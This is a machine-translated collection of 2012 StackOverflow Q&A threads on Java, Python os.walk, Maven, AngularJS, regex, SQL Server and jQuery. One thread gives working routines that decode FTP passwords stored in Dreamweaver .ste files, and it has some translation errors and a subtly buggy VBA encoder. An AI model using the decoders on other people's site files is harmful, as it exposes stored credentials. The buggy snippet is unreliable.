# StackOverflow 问答 10989000-10989999

# java - 为什么我会收到 NullPointerException 错误？

> ID：10989001
> 
> 赞同：0
> 
> 时间：2012-06-12T00:01:39.747
> 
> 标签：java, nullpointerexception

这是我的代码...

```
 import javax.swing.JButton;
    import javax.swing.JFrame;
    import javax.swing.JOptionPane;
    import javax.swing.JPanel;

public class test extends JFrame {
    public test() {     
        setSize(1000,600);
    }

    private static JButton[] remove;
    private static JPanel p = new JPanel();

    public static void main(String[]args){
        JFrame t = new test();
        remove = new JButton[25];
        for (int i = 0; i < 25; i++) { 
            remove[i].setBounds(243, 92 + 30 * i, 85, 20);
        }
    t.setVisible(true);
    }

} 
```

我创建了一个包含 25 个按钮的数组，但为什么它仍然抛出这个错误：S？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T00:03:38.663

在您的行中：

```
remove = new JButton[25]; 
```

您正在为 JButton 对象创建一个包含 25 个插槽的数组。您现在必须创建要放入数组的每个 JButton。

```
for(int i= 0; i < 25; i++) {
   remove[i] = new JButton();
} 
```

之后，当您尝试访问数组元素时，您将直接访问您之前创建的 JButton 之一。

在此之前，您创建的数组仅包含 null 元素，当您尝试访问其中一个数组插槽时，就好像您试图要求 null 引用做某事，这是不可能的，这就是您得到`NullPointerException`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T00:03:09.480

有了这个`remove = new JButton[25]`，您只需创建`buttons-array`25 个项目的容量，但您的数组是空的。所以你必须先创建新的`Button`，然后你可以`setBounds(243, 92 + 30 * i, 85, 20)`为每个设置。

```
remove = new JButton[25];
for(int i=0;i<25;i++){
   remove[i] = new JButton();
   remove[i].setBounds(243,92+30*i,85,20);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T00:05:28.380

所有未初始化为指向堆上对象的引用都设置为 null。

试试这个：

```
 // Ever heard of "magic numbers"?  These are very bad, indeed.
    // Your snippet is loaded with them.
    remove = new JButton[25];
    for(int i=0;i<25;i++){
        remove[i] = new JButton();
        remove[i].setBounds(243,92+30*i,85,20);
    } 
```

# html - 地理位置许可样式

> ID：10989004
> 
> 赞同：-2
> 
> 时间：2012-06-12T00:01:51.167
> 
> 标签：html, css, geolocation, styles

有谁知道设置酒吧样式的方法，要求允许运行地理定位？

```
<? nothing nothing nothing nothing ?>
<? nothing nothing nothing nothing ?>
<? nothing nothing nothing nothing ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T12:56:48.680

您能否用更多细节/您实际希望完成的任务来重新表述这个问题（也可能是“结果”图片）？您可能还想添加一个 php 标签？

另外，我们会在计算机、移动设备上，还是两者兼而有之？

简短的回答，如果我理解您的问题是您是否可以更改弹出/消息栏，我会说不能，因为它在不同的浏览器中的行为似乎也不同，使用它自己的网络栏/消息。

# python - 我理解 os.walk 对吗？

> ID：10989005
> 
> 赞同：86
> 
> 时间：2012-06-12T00:01:53.070
> 
> 标签：python, file

root、dir、file in 的循环`os.walk(startdir)`通过这些步骤工作吗？

```
for root in os.walk(startdir) 
    for dir in root 
        for files in dir 
```

1.  获取起始目录的根目录：C:\dir1\dir2\startdir

2.  获取 C:\dir1\dir2\startdir 中的文件夹并返回文件夹列表“dirlist”

3.  在第一个 dirlist 项中获取文件，并将文件列表“filelist”作为文件列表列表的第一项返回。

4.  移动到 dirlist 中的第二项，并将此文件夹“filelist2”中的文件列表作为文件列表列表的第二项返回。等等

5.  移动到文件夹树中的下一个根并从 2\. 等开始。

对？还是首先获取所有根目录，然后是所有目录，然后是所有文件？

* * *

## 回答 #1

> 赞同：108
> 
> 时间：2012-06-12T00:27:49.087

`os.walk`返回一个生成器，它创建一个值元组（current_path、current_path 中的目录、current_path 中的文件）。

每次调用生成器时，它都会递归地跟踪每个目录，直到调用 walk 的初始目录中没有可用的子目录。

像这样，

```
os.walk('C:\dir1\dir2\startdir').next()[0] # returns 'C:\dir1\dir2\startdir'
os.walk('C:\dir1\dir2\startdir').next()[1] # returns all the dirs in 'C:\dir1\dir2\startdir'
os.walk('C:\dir1\dir2\startdir').next()[2] # returns all the files in 'C:\dir1\dir2\startdir' 
```

所以

```
import os.path
....
for path, directories, files in os.walk('C:\dir1\dir2\startdir'):
     if file in files:
          print('found %s' % os.path.join(path, file)) 
```

或这个

```
def search_file(directory = None, file = None):
    assert os.path.isdir(directory)
    for cur_path, directories, files in os.walk(directory):
        if file in files:
            return os.path.join(directory, cur_path, file)
    return None 
```

或者如果你想查找文件，你可以这样做：

```
import os
def search_file(directory = None, file = None):
    assert os.path.isdir(directory)
    current_path, directories, files = os.walk(directory).next()
    if file in files:
        return os.path.join(directory, file)
    elif directories == '':
        return None
    else:
        for new_directory in directories:
            result = search_file(directory = os.path.join(directory, new_directory), file = file)
            if result:
                return result
        return None 
```

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2019-02-20T16:00:42.007

**最小可运行示例**

这就是我喜欢学习的方式：

```
mkdir root
cd root
mkdir \
  d0 \
  d1 \
  d0/d0_d1
touch \
  f0 \
  d0/d0_f0 \
  d0/d0_f1 \
  d0/d0_d1/d0_d1_f0
tree 
```

输出：

```
.
├── d0
│   ├── d0_d1
│   │   └── d0_d1_f0
│   ├── d0_f0
│   └── d0_f1
├── d1
└── f0 
```

主文件

```
#!/usr/bin/env python3
import os
for path, dirnames, filenames in os.walk('root'):
    print('{} {} {}'.format(repr(path), repr(dirnames), repr(filenames))) 
```

输出：

```
'root' ['d0', 'd1'] ['f0']
'root/d0' ['d0_d1'] ['d0_f0', 'd0_f1']
'root/d0/d0_d1' [] ['d0_d1_f0']
'root/d1' [] [] 
```

这让一切都清楚了：

*   `path`是每一步的根目录
*   `dirnames`是每个目录基名的列表`path`
*   `filenames`是每个文件基名的列表`path`

在 Ubuntu 16.04、Python 3.5.2 上测试。

**修改`dirnames`更改树递归**

这基本上是你唯一需要记住的事情。

例如，如果您对 执行以下操作`dirnames`，则会影响遍历：

*   [种类](https://stackoverflow.com/questions/6670029/can-i-force-python3s-os-walk-to-visit-directories-in-alphabetical-order-how)
*   [筛选](https://stackoverflow.com/questions/19859840/excluding-directories-in-os-walk)

**遍历文件或目录**

如果 traverse 的输入是文件或目录，则可以这样处理：

```
#!/usr/bin/env python3

import os
import sys

def walk_file_or_dir(root):
    if os.path.isfile(root):
        dirname, basename = os.path.split(root)
        yield dirname, [], [basename]
    else:
        for path, dirnames, filenames in os.walk(root):
            yield path, dirnames, filenames

for path, dirnames, filenames in walk_file_or_dir(sys.argv[1]):
    print(path, dirnames, filenames) 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2016-07-15T10:20:38.657

简而言之，os.walk() 将生成给定路径中存在的路径、文件夹、文件的元组，并将继续遍历子文件夹。

```
import os.path
path=input(" enter the path\n")
for path,subdir,files in os.walk(path):
   for name in subdir:
       print os.path.join(path,name) # will print path of directories
   for name in files:    
       print os.path.join(path,name) # will print path of files 
```

这将生成所有子目录、文件和子目录中文件的路径

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-06-12T00:27:48.673

[这是os.walk()](http://docs.python.org/library/os.html?highlight=os.walk#os.walk)如何工作的一个简短示例，并使用一些[os](http://docs.python.org/library/os.html)函数进行了一些解释。

首先注意[os.walk()](http://docs.python.org/library/os.html?highlight=os.walk#os.walk)返回*三个*项目，根目录、`dirs`当前根目录下的目录列表 ( ) 以及在这些目录中找到的文件列表。该[文档](http://docs.python.org/library/os.html?highlight=os.walk#os.walk)将为您提供更多信息。

`dirs`将包含根目录下的目录列表，而 files 将包含在这些目录中找到的所有文件的列表。在下一次迭代中，上一个`dirs`列表中的每个目录将依次扮演角色，`root`搜索将从那里继续，只有在搜索完当前级别后才会下一个级别。

代码示例：这将搜索、计算和打印指定搜索目录（您的根目录）下的文件名`.jpg` 和文件名。`.gif`它还利用[os.path.splitext()](http://docs.python.org/library/os.path.html?highlight=splitext#os.path.splitext)函数将文件的基础与其扩展名分开，并使用[os.path.join()](http://docs.python.org/library/os.path.html?highlight=os.path.join#os.path.join)函数为您提供包含找到的图像文件的路径的全名。

```
import os

searchdir = r'C:\your_root_dir'  # your search starts in this directory (your root) 

count = 0
for root, dirs, files in os.walk(searchdir):
    for name in files:
        (base, ext) = os.path.splitext(name) # split base and extension
        if ext in ('.jpg', '.gif'):          # check the extension
            count += 1
            full_name = os.path.join(root, name) # create full path
            print(full_name)

print('\ntotal number of .jpg and .gif files found: %d' % count) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-06-12T00:24:57.723

os.walk 的工作方式与上面的略有不同。基本上，它返回（路径、目录、文件）的元组。要看到这一点，请尝试以下操作：

```
import pprint
import os
pp=pprint.PrettyPrinter(indent=4)
for dir_tuple in os.walk("/root"):
    pp.pprint(dir_tuple) 
```

...您将看到循环的每次迭代都将打印一个目录名称，该目录中立即列出的所有目录的名称，以及该目录中所有文件的另一个列表。os.walk 然后会进入子目录列表中的每个目录，并做同样的事情，直到原根目录的所有子目录都被遍历完。了解一些有关递归的知识以了解其工作原理可能会有所帮助。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2021-07-19T09:20:13.850

我的回答非常基本和简单。我自己也是一个初学者，在网上找到了我的答案（尤其是[docs.python.org 上的好文档](https://docs.python.org/2/library/os.html#os.walk)）并尝试了一些测试代码，比如这个：

```
for root, dirs, files in os.walk(startdir)
    print ("__________________")
    print (root)
    for file in files:
        print ("---",file) 
```

这会打印出目录树，其中每个目录（起始目录和包含的子目录）前面都有一行，后面是其中包含的文件。

我认为你必须记住两点：

(1) os.walk 生成一个三元组（一个三元组）<root,dirs,filenames> 其中

*   root 是一个包含根目录名称的**字符串；**

*   dirs 是一个字符串**列表**：根目录中直接包含的目录名，即第一级，可能不包含子目录；

*   filenames 是一个字符串**列表**：根目录中直接包含的文件名。

(2) for 循环，例如

```
for root, subdirs, files in os.walk(YourStartDir) 
```

循环通过根目录及其所有子目录。每个文件都不需要一个步骤；它只是扫描目录树，并在每一步（对于树中的每个目录）填充其中包含的文件名列表和直接包含在其中的子目录列表。如果你有*n 个*目录（包括根目录和它的子目录），for 循环循环*n*次，即**它需要*n*步。**您可以编写一小段测试代码来检查这一点，例如使用计数器。在每一步，它都会生成一个 3 元组：一个字符串加上两个（可能是空的）字符串列表。在本例中，三元组的元素被称为：“root”、“subdirs”、“files”，但这些名称由您决定；如果您的代码是

```
for a, b, c in os.walk(startdir) 
```

三元组的元素将被称为“a”、“b”、“c”。

让我们回到测试代码：

```
for root, dirs, files in os.walk(startdir)
    print ("__________________")
    print (root)
    for file in files:
        print ("---",file) 
```

**第一个循环**：root 是您在输入中给出的目录（起始路径，起始目录：一个字符串），dirs 是包含的子目录名称的列表（但不是其中包含的目录的名称），文件是包含文件的列表。在测试代​​码中，我们没有使用列表“dirs”。

**第二个循环**：root 现在是第一个子目录，dirs 是其中包含的子目录的*列表*，files 是其中包含的文件的列表。

**...**依此类推，直到到达树中的最后一个子目录。

os.walk 有三个可选参数：你可以在网上找到很多关于它们及其使用的信息，但我认为你的问题是关于 os.walk 的基础知识。

# php - 订单（电子商务）像素跟踪如何工作？

> ID：10989009
> 
> 赞同：-1
> 
> 时间：2012-06-12T00:02:03.407
> 
> 标签：php, json, web-services

我正在考虑在我们的网站上构建一个应用程序，以通过我们的网站跟踪订单位置，并通过 JSON 提要将它们传递给另一个应用程序。只是想知道是否有人知道任何教程来做这种事情？我猜这将使用 web 服务或 JSON => 数据库提要来完成。有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:13:41.927

你的问题是关于像素跟踪的，所以我想你可能会问一个[网络错误](http://en.wikipedia.org/wiki/Web_bug)。在 bug 上附加一个 cookie，你会得到很多有趣的数据。当心现代浏览器的安全设置。

JSON 只是一种用于传输或存储数据的格式。对于网络错误，您不需要它。

# dreamweaver - 对 *.ste 文件中的 Adob e Dreamweaver 密码进行编码和解码

> ID：10989010
> 
> 赞同：2
> 
> 时间：2012-06-12T00:02:10.083
> 
> 标签：dreamweaver

如何对密码进行编码或解码以[从 Adob​​e Dreamweaver *.ste 文件中检索密码](http://helpx.adobe.com/dreamweaver/using/import-export-dreamweaver-site-settings.html)，或动态创建旨在导入 Dreamweaver 的 *.ste 文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T00:02:11.800

此 Javascript 函数可用于对密码进行编码：

```
function encodePassword(input)
{
    var top = 0;
    var output = '';

    for(var i = 0; i < input.length; i++){
        var currentChar = input.charCodeAt(i);
        if(currentChar < 0 || currentChar > 0xFFFF){return(false);}
        if(top != 0){
            if(0xDC00 <= currentChar && currentChar <= 0xDFFF){
                output += dec2hex(0x10000 + ((top - 0xD800) << 10) + (currentChar - 0xDC00) + i) + '';
                top = 0;
                continue;
                // Insert alert for below failure
            }else{return(false);}
        }
        if(0xD800 <= currentChar && currentChar <= 0xDBFF){top = currentChar;}
        else{output += dec2hex(currentChar + i) + '';}
    }

    return(output);
}

function dec2hex(input){return(input+0).toString(16).toUpperCase();} 
```

这个函数可以用来解码密码：

```
function decodePassword(input)
{
    var output = "";

    if(input.length == 0){return("");}

    for(var i = 0; i < input.length / 2; i++){
        var currentHex = parseInt(input.substr(i * 2, 2), 16);
            if(currentHex <= 0xFFFF){
                output += String.fromCharCode(currentHex - i);
            }else if(currentHex <= 0x10FFFF){
                currentHex -= 0x10000
                output += String.fromCharCode(0xD800 | (currentHex >> 10)) + String.fromCharCode(0xDC00 | (currentHex & 0x3FF) - i);
            }else{
                //Insert alert for below failure
                return(false);
        }
    }

    return(output);
} 
```

您也可以使用此工具在没有任何代码的情况下在线执行此操作：http: [//blog.affirmix.com/2009/05/05/live-ste-dreamweaver-password-encoder-and-decoder/](http://blog.affirmix.com/2009/05/05/live-ste-dreamweaver-password-encoder-and-decoder/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-06T04:56:27.523

要解码 Dreamweaver 密码，您需要将密码分成一对十六进制 (0-9, AF) 数字，然后根据字符串在字符串中的位置从每个十六进制数字中减去，从 0 开始，然后转换回 ascii。

5470714865787F 的加密密码将是...

```
54-0 = 54 => T  
70-1 = 6F => o  
71-2 = 6F => o  
48-3 = 45 => E  
65-4 = 61 => a  
78-5 = 73 => s  
7F-6 = 79 => y 
```

所以 5470714865787F => '太容易'

> 我们的网站上有一个这样的工作示例，可让您解码您的密码。您还可以复制/粘贴整个 .ste 文件，它将输出连接所需的 FTP 详细信息，节省一些时间...
> 
> [http://www.mywebsitespot.com/dreamweaver-password-decode](http://www.mywebsitespot.com/dreamweaver-password-decode)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-17T20:38:16.037

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-12-25T05:06:34.840

我今天需要为客户创建许多 DW ste 文件。我使用以下`VBA`内容直接从 Excel 中完成。我使用来自@andrew-odri 的代码作为基础。

```
Function decodeDreamWeaverPass(sHash$)
    Dim sPass$, i&, lHash&, lChar&, sChars$
    lHash = Len(sHash) - 1
    For i = 0 To lHash Step 2
        sChars = Mid(sHash, i + 1, 2)
        lChar = CLng("&H" & sChars)
        lChar = lChar - (i / 2)
        sPass = sPass & Chr(CLng(lChar))
    Next
    decodeDreamWeaverPass = sPass
End Function

Function encodeDreamWeaverPass(sPassword$)
    Dim lTop&, i&, sOutput$
    Dim lPassword&, sChar$, lChar&
    lTop = 0

    lPassword = Len(sPassword) - 1
    For i = 0 To lPassword
        lChar = Asc(Mid(sPassword, i + 1, 1))
        sChar = Chr(lChar)

        If ((lChar < 0) Or (lChar > 65535)) Then
          encodeDreamWeaverPass = ""
        End If

        If lTop > 0 Then
            If (lChar >= 56320) And (lChar <= 57343) Then
                sOutput = sOutput & Hex(65536 + ((lTop - 55296) Xor 10) + (lChar - 56320) + i)
                lTop = 0
            Else
              encodeDreamWeaverPass = ""
            End If
        End If

        If (lChar >= 55296) And (lChar <= 56319) Then
          lTop = lChar
        Else
          sOutput = sOutput & Hex(lChar + i)
        End If
    Next

    encodeDreamWeaverPass = sOutput
End Function 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-03-01T14:54:31.900

唤醒一个旧线程，但除了接受的 JavaScript 答案之外，我只想为任何感兴趣的人留下两个 PHP 函数：

**对密码进行编码：**

```
function dwste_encode( $pw ){
    $output = '';
    $split = str_split( $pw );
    foreach( $split as $key => $value ){
        $char = ord( $value );
        $char = ( $char + $key );
        $char = dechex( $char );
        $output .= strtoupper( $char );
    }
    return $output;
} 
```

**要解码密码：**

```
function dwste_decode( $pw ){
    $output = '';
    $split = str_split( $pw, 2 );
    foreach( $split as $key => $value ){
        $char = hexdec( $value );
        $char = ( $char - $key );
        $char = chr( $char );
        $output .= $char;
    }
    return $output;
} 
```

# ios - 重用视图控制器及其 ivars、scrollviews、tableview

> ID：10989013
> 
> 赞同：2
> 
> 时间：2012-06-12T00:02:57.680
> 
> 标签：ios, cocoa-touch, uitableview, memory-management

聪明的人，

一般问题，因为代码太多了，无法在这里过去。我知道我会得到一般性的答案。我只是希望获得更多关于在哪里寻找解决方案的想法。这是我的设置：

```
OpenGL view - "game view"
UIView - "city view"
ScrollView "city menu"
The scrollview uses 6 view controllers.
One viewController in scroll contains a tableView 
```

当“玩家”进入“城市”时，会出现滚动视图并显示所有视图控制器和中提琴，一切正常。

问题是当“玩家”离开“城市”并进入下一个“城市”时，视图控制器仍然包含来自最后一个“城市”的信息。

尽管有以下情况：

*   当“玩家”离开“城市”时，包含滚动视图的所有视图控制器的数组设置为 nil。

*   当“玩家”进入一个新的“城市”时，同样的数组被设置为一个新分配的数组。

*   视图控制器中的 ivars 在其 viewWillDisappear 时设置为 nil。

*   视图控制器中的 ivars 在其初始化期间被设置为一个新数组。

*   视图控制器的初始化所有 ivars 在它们的初始化过程中都会重新初始化（我也在 viewWillAppear 中尝试过）。

*   tableView 使用数组调用（前面提到的 ivars）。

我很感激任何建议。

乙

*   这让我如此疯狂的原因是，我清楚地将带有视图控制器的数组分配给 nil。所有这些对象都应该被释放。齐尔奇。

已解决：似乎我的一个数据数组的保留计数在某处被任意减少。我唯一的猜测是，在 tableView 转换的某个地方它会减少。谢谢你的看法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-08T01:57:11.647

已解决：似乎我的一个数据数组的保留计数在某处被任意减少。我唯一的猜测是，在 tableView 转换的某个地方它会减少。

# eclipse - Maven 依赖于 Eclipse 中的父项目构建路径

> ID：10989018
> 
> 赞同：0
> 
> 时间：2012-06-12T00:03:33.850
> 
> 标签：eclipse, maven, jar, parent, buildpath

我正在使用m2e。所以我有两个项目。当我右键单击它们时，它们都启用了 Maven。所以其中一个项目是父项目，因此它有许多子包，每个子包都是正确的 src\target，但不是父项目本身。我有 pom.xml 用于父母和所有孩子。

当我右键单击这两个项目时，maven 然后更新配置。maven 存储库被添加到简单项目中，但没有添加到其余项目的父项目中。那么在这种情况下我应该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T00:51:48.277

您必须执行一个`mvn install`工件才能安装在存储库中，“更新项目配置”类似于[maven eclipse 插件](http://maven.apache.org/plugins/maven-eclipse-plugin/index.html)`mvn eclipse:eclipse`的目标。

# javascript - 加载 Angularjs 时出错

> ID：10989021
> 
> 赞同：0
> 
> 时间：2012-06-12T00:03:57.517
> 
> 标签：javascript, angularjs

加载 angularjs 时出现奇怪的错误。我试图在网上搜索，但没有找到。你知道那是什么意思吗？

```
Error: Syntax Error: Token ',' is an unexpected token at column 5 of the expression ['ar', 'Arabic'),
...
('zh-tw', 'Traditional Chinese'].
at Error (unknown source)
at throwError (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:5845:11)
at parser (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:5839:5)
at http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:6402:29
at http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:4822:27
at addTextInterpolateDirective (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:4406:27)
at collectDirectives (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:3908:11)
at compileNodes (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:3798:21)
at compileNodes (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:3806:14)
at compileNodes (http://127.0.0.1:8001/static/js/libs/angularjs/angular-1.0.0rc11.js:3806:14) angular-1.0.0rc11.js:5541
$get 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T08:27:46.070

经过数小时的反复试验，终于发现这里发生了什么。认为值得与你们分享，这样您在面对同样的问题时就不会浪费时间。

`((`问题是我`))`在配置`interpolateProvider`. 将开始和结束符号更改为另一个符号后，错误就消失了。

# regex - 正则表达式：匹配、解析对请求的 FTP 响应

> ID：10989022
> 
> 赞同：3
> 
> 时间：2012-06-12T00:03:59.263
> 
> 标签：regex, parsing, ftp, ftpwebrequest

这是我正在尝试做的事情：

我要在我的一个应用程序中拥有一些 FTP 功能（这仅适用于我自己，而不是业务应用程序等）并且由于我不想为自己编写所有 FTP 请求/响应代码，所以我（懒惰伙计，我）在互联网上搜索 FTP 包装器。
我找到[了这个 DLL](http://www.codeproject.com/Articles/11991/An-FTP-client-library-for-NET-2-0)。

这一切都非常棒，就像一个魅力。除了一件事：当我在 FTP 服务器上请求特定文件的 LastWriteTime 时，DLL 给了我奇怪的日期（即打印出虚构的日期）。我已经能够找到问题所在。每当您向 FTP 服务器发送请求时，它都会返回一个单行响应，该响应具有非常特殊的格式。现在我已经能够收集到，这种格式对于大多数服务器来说都是不同的，我的包装 DLL 带有 6 种预定义的响应格式，但我的 FTP 服务器发回了第 7 种格式。这是对请求和 REGEX 格式的响应：

```
-rw-r--r--    1 user   user          594 Jun 11 03:44 random_log.file 
```

这是我的正则表达式解析格式：

```
 "(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})\s+\d+\s+\w+\s+\w+\s+(?<size>\d+)\s+(?<timestamp>\w+\s+\d+\s+\d{4})\s+(?<name>.+)", _
 "(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})\s+\d+\s+\d+\s+(?<size>\d+)\s+(?<timestamp>\w+\s+\d+\s+\d{4})\s+(?<name>.+)", _
 "(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})\s+\d+\s+\d+\s+(?<size>\d+)\s+(?<timestamp>\w+\s+\d+\s+\d{1,2}:\d{2})\s+(?<name>.+)", _
 "(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})\s+\d+\s+\w+\s+\w+\s+(?<size>\d+)\s+(?<timestamp>\w+\s+\d+\s+\d{1,2}:\d{2})\s+(?<name>.+)", _
 "(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})(\s+)(?<size>(\d+))(\s+)(?<ctbit>(\w+\s\w+))(\s+)(?<size2>(\d+))\s+(?<timestamp>\w+\s+\d+\s+\d{2}:\d{2})\s+(?<name>.+)", _
 "(?<timestamp>\d{2}\-\d{2}\-\d{2}\s+\d{2}:\d{2}[Aa|Pp][mM])\s+(?<dir>\<\w+\>){0,1}(?<size>\d+){0,1}\s+(?<name>.+)" 
```

这些似乎都不能正确解析日期时间，因为我不知道该怎么做，请一位 REGEX 专业人士给我写一个能够解析上述 FTP 响应的 ParsingFormat 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T00:10:45.067

Both a hand-check and `irb` check of the fourth format shows that it *does* match:

```
> re=/(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})\s+\d+\s+\w+\s+\w+\s+(?<size>\d+)\s+(?<timestamp>\w+\s+\d+\s+\d{1,2}:\d{2})\s+(?<name>.+)/
=> /(?<dir>[\-d])(?<permission>([\-r][\-w][\-xs]){3})\s+\d+\s+\w+\s+\w+\s+(?<size>\d+)\s+(?<timestamp>\w+\s+\d+\s+\d{1,2}:\d{2})\s+(?<name>.+)/
> m=re.match("-rw-r--r--    1 user   user          594 Jun 11 03:44 random_log.file")
=> #<MatchData "-rw-r--r--    1 user   user          594 Jun 11 03:44 random_log.file" dir:"-" permission:"rw-r--r--" size:"594" timestamp:"Jun 11 03:44" name:"random_log.file">
> m['dir']
=> "-"
> m['permission']
=> "rw-r--r--"
> m['size']
=> "594"
> m['timestamp']
=> "Jun 11 03:44"
> m['name']
=> "random_log.file"
> 
```

I think the pile of regular expressions are fine. Perhaps you need to look elsewhere for the problem.

# python - 确保 Hadoop EMR 上的日志

> ID：10989024
> 
> 赞同：2
> 
> 时间：2012-06-12T00:05:28.177
> 
> 标签：python, hadoop, amazon-web-services, amazon-emr, emr

我在 Amazon EMR（15 个节点，>1.5 小时）上有一个长时间运行的 Hadoop 流作业。该作业在完成度约为 75% 时失败。我将 Python 用于 mapper 和 reducer。

我做了以下优化：

```
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
sys.stderr = os.fdopen(sys.stderr.fileno(), 'w', 0)

logging.getLogger().setLevel(logging.INFO) 
```

在使用模块发布日志条目后，我还添加了以下内容`logging`：

```
 sys.stderr.flush()
    time.sleep(30)
    sys.exit(3) 
```

尝试捕获错误无济于事：Hadoop 日志文件不显示我的错误 :(

如何让 Hadoop 记录我的消息而不丢弃任何消息？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-14T15:40:17.440

我不是 100% 了解 python 解决方案，但我知道在使用 EMR 命令行界面时，您必须在 Amazon S3 中指定日志记录 URI。

例如

```
./elastic-mapreduce --create --other-options --log-uri s3n://emr.test/logs 
```

这是在集群启动时指定的。然后在 S3 上的日志目录下创建以下目录

```
/jobflowid
   /daemons
   /jobs
   /nodes
   /steps
   /task-attempts 
```

在 /steps 下，每个单独的作业都有一个文件夹，在此下方，作业的 stderr、stdout 和控制器输出都写在这里。

# sql-server - 如何在 SQL Server 中为 SELECT 语句的结果设置日期格式

> ID：10989026
> 
> 赞同：1
> 
> 时间：2012-06-12T00:05:29.637
> 
> 标签：sql-server

我知道如何在 SELECT 语句中使用 CONVERT 函数来更改日期列的格式：

```
 SELECT 
       StationID
       , CONVERT(varchar, [Date], 101) as Date
       , Value 
   FROM my_table 
```

但是我想知道我是否可以在运行 SELECT 语句之前设置日期格式，当我不知道以下 SELECT 语句中日期列的名称时：

```
 SELECT * from FROM my_table 
```

是否可以在 SELECT 语句之前运行任何 SET 语句或其他 T-SQL，以便我可以临时更改日期格式？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T00:57:46.407

不。

特别是，您选择的任何日期列实际上根本没有格式化，而是作为用于日期的二进制“格式”中的实际日期数据沿线路返回。如果您看到它们已格式化，那是因为您的客户（管理工作室或其他工具）正在将它们转换为要显示的字符串。

当您使用`SELECT *`时，显然无法告诉 SQL Server 对任何特定列进行任何转换，因此无论底层查询返回的数据类型如何，数据都将返回。因此，无论您的数据类型是否真的是日期，无论如何都不会发生任何操作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T00:13:33.953

我很确定没有办法按照你的要求做。但是，当您使用编程语言输出日期字符串时，有一些方法可以对其进行格式化。

# javascript - 幻灯片样式图片库

> ID：10989031
> 
> 赞同：2
> 
> 时间：2012-06-12T00:06:11.527
> 
> 标签：javascript, jquery, html, css

我正在尝试弄清楚如何创建一个如下图所示的图片库，以便将其放置在我的网站上。我想知道是否有人可以为我指出正确的教程方向？我找到了很多不错的画廊来展示我的图像，但没有一个像我所追求的幻灯片风格那样显示图像。

画廊要求：

1.  单击箭头时，图库条将向左/向右移动一张图片
2.  将鼠标悬停在图像上会使图像变暗，并显示有关图像的一些标题

![幻灯片风格画廊的例子](../Images/7fe14fe73aacef58ab33d5c59a82dbb6.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T01:17:25.703

我刚刚回答了有人使用[carouFredSel](http://caroufredsel.frebsite.nl/)的问题。这个 jQuery 插件看起来会很好用，虽然我不认为它有内置的悬停效果。不过老实说，这是比较容易的部分。

诀窍是使宽度略大于要显示的图像，这会导致每侧都有部分图像。

这是一个[jsfiddle](http://jsfiddle.net/6mj4N/7/)来说明。

* * *

**更新：**
OP 询问是否可以重新定位页面导航链接。我修改了[jsfiddle](http://jsfiddle.net/6mj4N/10/)以这种方式工作。新增内容如下：

```
.list_carousel {
    position: relative;
}
#prev2 {
    position: absolute;
    top: 35px;
    left: 0;
}
#next2 {
    position: absolute;
    top: 35px;
    right: 0;
} 
```

如果你有一个相对定位的容器元素，你可以绝对定位子元素。我为容器添加了相对定位`list_carousel`，然后我可以绝对定位容器内的导航箭头。将值更改为`top`垂直位置，左/右更改为水平位置。

我还一起删除了寻呼机，因为它不是基于原始示例的要求。如果您将页面箭头更改为图像，这几乎就是您想要的。

* * *

**更多更新**
我决定更进一步，使`hover`效果更像示例。请参阅新的[jsfiddle](http://jsfiddle.net/6mj4N/11/)。这些变化是：

*   在列表项中的所有文本周围添加了 span 包装器
*   添加`$(".list_carousel li span").hide();`以隐藏所有跨度
*   修改悬停事件以切换跨度

我还添加了一些 CSS 来定位跨度文本：

```
.list_carousel li { 
    position: relative;
}
.list_carousel li span {
    position: absolute;
    bottom: 0;
    display: block;
    text-align: center;
    width: 100%;
} 
```

* * *

**最后更新（我保证！）**
我决定全力以赴并添加透明层：[jsfiddle](http://jsfiddle.net/6mj4N/13/)

悬停修改：
`$(this).prepend($("<div class='hover-transparency'></div>"));`并`$(this).find("div:first").remove();`在悬停时添加/删除透明层。

CSS 修改：

```
.hover-transparency {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    background-color: rgba(0, 0, 0, 0.60);
} 
```

